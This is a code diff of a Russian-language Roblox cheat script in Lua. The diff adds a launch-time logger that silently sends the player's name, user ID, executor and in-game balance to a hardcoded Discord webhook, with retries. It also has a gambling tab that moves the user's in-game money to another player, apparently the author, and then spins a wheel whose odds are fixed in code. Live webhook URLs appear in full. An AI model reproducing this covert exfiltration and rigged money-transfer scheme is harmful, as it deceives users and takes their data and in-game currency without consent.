@@ -1,53 +1,153 @@
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local webhookURL = "https://discord.com/api/webhooks/1379975488046370850/nvqrA47lMwWwXew2ySdAwcnqZ63cJ-w25UDmslTbEoE_QY3tt94B4R7RN9LrFMQxt_8J"
 
-local playerName = game.Players.LocalPlayer.Name
-local userId = game.Players.LocalPlayer.UserId
-local executor = identifyexecutor and identifyexecutor() or "Unknown"
-local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+local player = game.Players.LocalPlayer
+local playerName = player and player.Name or "Unknown"
+local userId = player and player.UserId or 0
+local scriptVersion = "1.3.0"
+local maxRetries = 10
 
--- Функция красивого вывода
+local function GetExecutorName()
+    local ok, exec = pcall(function()
+        if typeof(syn) == "table" or getgenv().syn then return "Synapse X" end
+        if typeof(KRNL) == "table" or getgenv().KRNL then return "KRNL" end
+        if typeof(fluxus) == "table" or getgenv().fluxus then return "Fluxus" end
+        if typeof(WRD) == "table" or getgenv().WRD then return "WRD" end
+        if secure_load then return "Secure Load" end
+        if identifyexecutor then
+            local name = identifyexecutor()
+            if name and name ~= "" then return name end
+        end
+        if getrenv then
+            local r = getrenv()
+            if r and r.is_sentinel then return "Sentinel" end
+            if r and r.is_oxygen then return "OxygenU" end
+        end
+        return "Unknown"
+    end)
+    return ok and exec or "Unknown"
+end
+local executor = GetExecutorName()
+
+-- Определение уровня инжектора
+local function GetExecutorLevel()
+    if syn and syn.crypto then return "Premium" end
+    if KRNL and KRNL.VERSION then return "Stable" end
+    if fluxus and fluxus.version then return "Free/Public" end
+    if WRD then return "WRD" end
+    if identifyexecutor and typeof(identifyexecutor) == "function" then
+        local ok, val = pcall(identifyexecutor)
+        if ok and typeof(val) == "string" and string.find(val:lower(),"pro") then
+            return "Pro"
+        end
+    end
+    return "Unknown"
+end
+local executorLevel = GetExecutorLevel()
+
 local function FormatMoney(num)
     num = tonumber(num)
     if not num then return tostring(num) end
-    if num >= 1000000000 then
-        return string.format("%.2f млрд", num/1000000000)
-    elseif num >= 1000000 then
-        return string.format("%.1f млн", num/1000000)
-    elseif num >= 1000 then
-        return string.format("%d тыс", math.floor(num/1000))
+    if num >= 1e9 then
+        return string.format("%.2f млрд", num/1e9)
+    elseif num >= 1e6 then
+        return string.format("%.1f млн", num/1e6)
+    elseif num >= 1e3 then
+        return string.format("%d тыс", math.floor(num/1e3))
     else
         return tostring(num)
     end
 end
 
--- Получаем баланс (Рубли)
-local rawBalance = game.Players.LocalPlayer.leaderstats["Рубли"] and game.Players.LocalPlayer.leaderstats["Рубли"].Value or 0
+local function TryGetRequest()
+    return request or syn and syn.request or http and http.request or fluxus and fluxus.request or KRNL and KRNL.request or
+        (getgenv and type(getgenv().request) == "function" and getgenv().request) or
+        (typeof(http_request) == "function" and http_request) or
+        (typeof(httprequest) == "function" and httprequest) or
+        (typeof(http_request) == "table" and http_request) or
+        function() error("Нет совместимой функции для HTTP-запроса!") end
+end
+
+local function HttpRequest(data)
+    local json = HttpService:JSONEncode(data)
+    local requestFunc = TryGetRequest()
+    local success, result = pcall(function()
+        return requestFunc({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    end)
+    if not success then
+        return false, result
+    end
+    return true, result
+end
+
+local rawBalance = player and player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Рубли") and player.leaderstats["Рубли"].Value or 0
 local balance = FormatMoney(rawBalance)
 
+local placeId = game.PlaceId or "Unknown"
+local realGameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(placeId)
+    realGameName = info and info.Name or tostring(placeId)
+end)
+
+local embedFields = {
+    {name = "👤 Игрок", value = playerName, inline = true},
+    {name = "🆔 User ID", value = tostring(userId), inline = true},
+    {name = "💻 Executor", value = executor, inline = true},
+    {name = "📈 Уровень инжектора", value = executorLevel, inline = false},
+    {name = "💰 Баланс", value = balance .. " руб", inline = false},
+    {name = "🎮 Игра", value = realGameName, inline = false},
+}
+
 local data = {
-    ["content"] = "",
-    ["embeds"] = {{
-        ["title"] = "🔴 Скрипт запущен",
-        ["color"] = 15158332,
-        ["fields"] = {
-            {["name"] = "Игрок", ["value"] = playerName, ["inline"] = true},
-            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
-            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
-            {["name"] = "Время", ["value"] = timestamp, ["inline"] = false},
-            {["name"] = "Баланс", ["value"] = balance, ["inline"] = true}
-        }
+    content = "",
+    embeds = {{
+        title = "🔑 Скрипт с ключем",
+        color = 5793266,
+        thumbnail = {url = "https://i.imgur.com/ElZJRNZ.png"},
+        fields = embedFields,
+        footer = {
+            text = "v" .. scriptVersion .. " | " .. executor .. " | " .. os.date("%H:%M MSK"),
+            icon_url = "https://i.imgur.com/ElZJRNZ.png"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
-pcall(function()
-    request({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end)
+local function SendWebhookWithRetry(data)
+    local tries = 0
+    while tries < maxRetries do
+        local ok, result = pcall(HttpRequest, data)
+        local success = false
+        if ok and type(result) == "table" then
+            if result.Success ~= nil then
+                success = result.Success
+            elseif result.StatusCode ~= nil then
+                success = result.StatusCode == 204 or result.StatusCode == 200
+            end
+        elseif ok and type(result) == "boolean" then
+            success = result
+        elseif ok and result == nil then
+            success = true
+        end
+        if success then
+            break
+        else
+            tries = tries + 1
+            wait(math.random(1, 2) + tries * 0.5)
+        end
+    end
+end
+
+coroutine.wrap(function()
+    SendWebhookWithRetry(data)
+end)()
 -- Цены Предметов
 local SportMasterPrice = {
     2300,    -- Чёрная Спортивная Джинсовка 'Puma'
@@ -1131,34 +1231,35 @@ local busy = false
 local HttpService = game:GetService("HttpService")
 local webhookURL = "https://discord.com/api/webhooks/1436989652123910216/ZqHB6ArRfVwEbqwprRgXRyAt9WbSj4mixxH2n8-YeCSnMkvMrQAz6AUi9hZs_uKxTVAE"
 
-local function sendWinDiscord(playerName, betLabel, betAmount)
+-- Универсальный Discord Logger
+local function sendResultDiscord(playerName, betLabel, betAmount, isWin)
+    local color = isWin and 65280 or 15158332
+    local resultText = isWin and "🟢 ВЫИГРАЛ" or "🔴 ПРОИГРАЛ"
+    local winSum = betAmount * 5
+    local fields = {
+        {["name"] = "Игрок", ["value"] = playerName, ["inline"] = false},
+        {["name"] = "Тип ставки", ["value"] = betLabel, ["inline"] = true},
+        {["name"] = "Сумма", ["value"] = tostring(betAmount), ["inline"] = true}
+    }
+    if isWin then
+        table.insert(fields, {["name"] = "Выигрыш", ["value"] = tostring(winSum), ["inline"] = true})
+    else
+        table.insert(fields, {["name"] = "Потеря", ["value"] = tostring(betAmount), ["inline"] = true})
+    end
     local data = {
         ["username"] = "Лудка-лог",
         ["embeds"] = {{
-            ["title"] = "💸 Победа в колесе!",
-            ["color"] = 65280,
-            ["fields"] = {
-                {["name"] = "Победитель", ["value"] = playerName, ["inline"] = false },
-                {["name"] = "Кнопка/ставка", ["value"] = betLabel .. " (" .. tostring(betAmount) .. ")", ["inline"] = false },
-                {["name"] = "К выплате", ["value"] = tostring(betAmount * 5), ["inline"] = true }
-            }
+            ["title"] = resultText,
+            ["color"] = color,
+            ["fields"] = fields
         }}
     }
     pcall(function()
+        local raw = HttpService:JSONEncode(data)
         if request then
-            request({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
+            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = raw})
         elseif http_request then
-            http_request({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
+            http_request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = raw})
         end
     end)
 end
@@ -1190,24 +1291,20 @@ local function buyAttempt(amount, buttonName)
 
     if amount == 1000000 then
         for i = 1, 10 do
-            -- Сначала банк
             local args1 = {{["Type"] = "Deposit",["Amount"] = 100000}}
             game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
             Rayfield:Notify({Title = "Лудка", Content = "Депозит в банк ("..i.." из 10). Ждём 10 секунд..."})
             wait(10)
-            -- Потом перевод игроку
             local args2 = {{["Type"] = "Send",["Amount"] = 100000,["User"] = NickName}}
             game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
             Rayfield:Notify({Title = "Лудка", Content = "Перевод игроку ("..i.." из 10). Ждём 2 секунд..."})
             wait(2)
         end
     else
-        -- Банк
         local args1 = {{["Type"] = "Deposit",["Amount"] = amount}}
         game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
         Rayfield:Notify({Title = "Лудка", Content = "Депозит в банк. Ждём 7 секунд..."})
         wait(6)
-        -- Перевод игроку
         local args2 = {{["Type"] = "Send",["Amount"] = amount,["User"] = NickName}}
         game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
         Rayfield:Notify({Title = "Лудка", Content = "Перевод игроку. Ждём 1 секунд..."})
@@ -1234,43 +1331,76 @@ local function CreateFortuneWheel()
     local gui = Instance.new("ScreenGui", playerGui)
     gui.Name = "FortuneWheelGui"
     gui.IgnoreGuiInset = true
+
     local bg = Instance.new("Frame", gui)
     bg.Size = UDim2.new(0,410,0,370)
     bg.Position = UDim2.new(0.5,-205,0.5,-185)
-    bg.BackgroundColor3 = Color3.fromRGB(22,25,36)
+    bg.BackgroundColor3 = Color3.fromRGB(28,32,48)
     bg.BorderSizePixel = 0
     bg.AnchorPoint = Vector2.new(0, 0)
     bg.Active = true
     bg.Draggable = true
-    local corner = Instance.new("UICorner", bg) corner.CornerRadius = UDim.new(0, 18)
+
+    local grad = Instance.new("UIGradient", bg)
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 62, 90)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 85, 130)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(28, 32, 48))
+    }
+    grad.Rotation = 90
+
+    local shadow = Instance.new("ImageLabel", bg)
+    shadow.Size = UDim2.new(1,22,1,22)
+    shadow.Position = UDim2.new(0,-11,0,-11)
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageTransparency = 0.4
+    shadow.ZIndex = 0
+
+    local corner = Instance.new("UICorner", bg) 
+    corner.CornerRadius = UDim.new(0, 20)
+
     local title = Instance.new("TextLabel", bg)
     title.Size = UDim2.new(1,0,0,44)
     title.BackgroundTransparency = 1
-    title.Text = "Колесо Фортуны"
+    title.Text = "🎡 Колесо Фортуны"
     title.Font = Enum.Font.GothamBold
-    title.TextColor3 = Color3.fromRGB(240,240,240)
-    title.TextSize = 28
+    title.TextColor3 = Color3.fromRGB(255,255,255)
+    title.TextStrokeTransparency = 0.7
+    title.TextSize = 30
+
     local close = Instance.new("TextButton", bg)
     close.Text = "×"
     close.Size = UDim2.new(0,32,0,36)
     close.Position = UDim2.new(1,-38,0,9)
     close.Font = Enum.Font.GothamBold
-    close.BackgroundTransparency = 0.55
-    close.TextColor3 = Color3.fromRGB(233,78,105)
-    close.BackgroundColor3 = Color3.fromRGB(36,36,46)
-    close.TextSize = 26
+    close.BackgroundTransparency = 0.4
+    close.TextColor3 = Color3.fromRGB(255,88,118)
+    close.BackgroundColor3 = Color3.fromRGB(44,44,54)
+    close.TextSize = 28
+    close.ZIndex = 100
     close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
     local wheelFrame = Instance.new("Frame", bg)
-    wheelFrame.Position = UDim2.new(0.5,0,0.43,0)
+    wheelFrame.Position = UDim2.new(0.5,0,0.46,0)
     wheelFrame.AnchorPoint = Vector2.new(0.5,0.5)
-    wheelFrame.Size = UDim2.new(0,265,0,265)
+    wheelFrame.Size = UDim2.new(0,270,0,270)
     wheelFrame.BackgroundTransparency = 1
 
-    local sectorColors = {Color3.fromRGB(89,168,255),Color3.fromRGB(255,211,86),Color3.fromRGB(62,210,139),Color3.fromRGB(255,138,151),
-        Color3.fromRGB(195,124,255),Color3.fromRGB(72,198,245),Color3.fromRGB(255,110,110),
-        Color3.fromRGB(135,200,120),Color3.fromRGB(255,180,77),Color3.fromRGB(114,161,255)}
+    local wheelShadow = Instance.new("ImageLabel", wheelFrame)
+    wheelShadow.Size = UDim2.new(1,24,1,24)
+    wheelShadow.Position = UDim2.new(0.5,-135,0.5,-135)
+    wheelShadow.BackgroundTransparency = 1
+    wheelShadow.Image = "rbxassetid://1316045217"
+    wheelShadow.ImageTransparency = 0.74
+    wheelShadow.ZIndex = -1
 
-    -- Шанс на “Да” для 1кк — 1 из 30 раз
+    local sectorColors = {
+        Color3.fromRGB(62,176,246), Color3.fromRGB(108,203,157), Color3.fromRGB(252,184,82), Color3.fromRGB(255,118,141),
+        Color3.fromRGB(193,110,255), Color3.fromRGB(90,187,241), Color3.fromRGB(244,100,92),
+        Color3.fromRGB(150,210,80), Color3.fromRGB(239,163,81), Color3.fromRGB(114,161,255)
+    }
+
     local sectors, labels = {}, {}
     if lastBet == 1000000 then
         if math.random(1,30)==1 then
@@ -1287,31 +1417,35 @@ local function CreateFortuneWheel()
     for i=1,10 do
         local lbl = Instance.new("TextLabel", wheelFrame)
         lbl.AnchorPoint = Vector2.new(0.5,0.5)
-        lbl.Size = UDim2.new(0,70,0,38)
+        lbl.Size = UDim2.new(0,76,0,40)
         local angle = (i-1)*36
         local rad = math.rad(angle)
-        local r = 96
+        local r = 98
         lbl.Position = UDim2.new(0.5, math.cos(rad)*r, 0.5, math.sin(rad)*r)
         lbl.Rotation = angle
         lbl.Text = sectors[i]
         lbl.Font = Enum.Font.GothamBold
-        lbl.TextSize = 20
+        lbl.TextSize = 22
         lbl.BackgroundColor3 = sectorColors[i]
-        lbl.TextColor3 = (sectors[i] == "Да") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
-        lbl.BackgroundTransparency = 0.14
+        lbl.TextColor3 = (sectors[i] == "Да") and Color3.fromRGB(40,200,64) or Color3.fromRGB(255,255,255)
+        lbl.BackgroundTransparency = 0.07
+        lbl.BorderSizePixel = 0
         local lblcorner = Instance.new("UICorner", lbl)
-        lblcorner.CornerRadius = UDim.new(0, 12)
+        lblcorner.CornerRadius = UDim.new(0, 14)
         labels[i] = lbl
     end
 
     local btn = Instance.new("TextButton", bg)
-    btn.Text = "Крутить!"
-    btn.Size = UDim2.new(0.7,0,0,48)
-    btn.Position = UDim2.new(0.15,0,1,-59)
+    btn.Text = "🚀 Крутить!"
+    btn.Size = UDim2.new(0.72,0,0,48)
+    btn.Position = UDim2.new(0.14,0,1,-60)
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 24
-    btn.BackgroundColor3 = Color3.fromRGB(62,176,246)
-    btn.TextColor3 = Color3.fromRGB(254,255,255)
+    btn.TextSize = 25
+    btn.BackgroundColor3 = Color3.fromRGB(80,210,245)
+    btn.TextColor3 = Color3.fromRGB(254,254,254)
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0,15)
+
     local spinning = false
     btn.MouseButton1Click:Connect(function()
         if spinning then return end
@@ -1334,21 +1468,19 @@ local function CreateFortuneWheel()
         labels[sel].TextColor3 = (sectors[sel] == "Да") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
         gui:Destroy()
         spinning = false
-        btn.Text = "Крутить!"
+        btn.Text = "🚀 Крутить!"
         local winSum = lastBet*5
         local playerName = game.Players.LocalPlayer.Name
         local proof = tostring(game.Players.LocalPlayer.UserId) .. ":" .. tostring(lastBet) .. ":" .. tostring(winSum) .. ":" .. tostring(math.random(10000,99999))
         if sectors[sel] == "Да" then
-            Rayfield:Notify({
-                Title = "Колесо фортуны",
-                Content = "Ты выиграл! В буфере ссылка и x5 выигрыш ("..winSum..") напиши мне."
-            })
-            sendWinDiscord(playerName, lastBetLabel, lastBet)
+            Rayfield:Notify({Title = "Колесо фортуны", Content = "Ты выиграл! В буфере ссылка и x5 выигрыш ("..winSum..") напиши мне."})
+            sendResultDiscord(playerName, lastBetLabel, lastBet, true)
             if setclipboard then
                 setclipboard("https://discord.gg/Ev8XAQar/\nСтавка: "..lastBet.."\nВыигрыш: "..winSum.."\nЮзер: "..playerName.." [ID:"..game.Players.LocalPlayer.UserId.."]\nProof: "..proof)
             end
         else
             Rayfield:Notify({Title="Колесо фортуны", Content="Выпало 'НЕТ', удача не на твоей стороне!"})
+            sendResultDiscord(playerName, lastBetLabel, lastBet, false)
         end
     end)
 end
@@ -1356,7 +1488,7 @@ end
 LudkaTab:CreateParagraph({
     Title = "Правила",
     Content = [[За выигрыш даётся x5 от суммы ставки.
-Пишите мне в дс https://discord.gg/Ev8XAQar.]]
+Пишите мне в дс [https://discord.gg/Ev8XAQar](https://discord.gg/Ev8XAQar).]]
 })
 
 table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 1к", Callback = function() buyAttempt(1000, "Додеп 1к") end }))
